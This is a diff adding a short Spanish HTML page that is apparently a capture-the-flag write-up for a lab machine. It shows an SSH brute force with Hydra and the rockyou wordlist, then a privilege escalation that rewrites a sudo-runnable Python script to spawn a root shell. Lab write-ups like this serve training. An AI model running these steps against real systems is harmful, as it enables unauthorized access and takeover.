@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Library Report</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #0047ab;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <div style="margin-left: 20%; margin-right: 20%;">
+        <h1>NMAP</h1>
+        <img src="image.png" alt="Resultado de escaneo NMAP">
+
+        <h1>WEB</h1>
+        <img src="image-1.png" alt="Interfaz Web Inicial">
+
+        <h1>Fuerza Bruta</h1>
+        <p>Usando Hydra para fuerza bruta en SSH:</p>
+        <pre><code>hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.146.26 -t4</code></pre>
+        <img src="image-2.png" alt="Resultado de Fuerza Bruta con Hydra">
+
+        <h1>SSH</h1>
+        <img src="image-3.png" alt="Conexión SSH Establecida">
+
+        <h1>Flag Usuario</h1>
+        <p>Comando utilizado para visualizar la bandera:</p>
+        <pre><code>cat user.txt</code></pre>
+        <img src="image-5.png" alt="Archivo de Bandera de Usuario">
+
+        <h1>Escalada de Privilegios</h1>
+        <p>Verificación de permisos con:</p>
+        <pre><code>sudo -l</code></pre>
+        <img src="image-6.png" alt="Permisos Sudo">
+        <p>Creación y ejecución de un script para obtener una shell:</p>
+        <pre><code>rm -f bak.py</code></pre>
+        <pre><code>echo 'import pty; pty.spawn("/bin/sh")' > /home/meliodas/bak.py</code></pre>
+        <pre><code>sudo python /home/meliodas/bak.py</code></pre>
+        <img src="image-7.png" alt="Escalada de Privilegios con Python">
+
+        <h1>Flag Root</h1>
+        <img src="image-8.png" alt="Archivo de Bandera de Root">
+    </div>
+</body>
+</html>
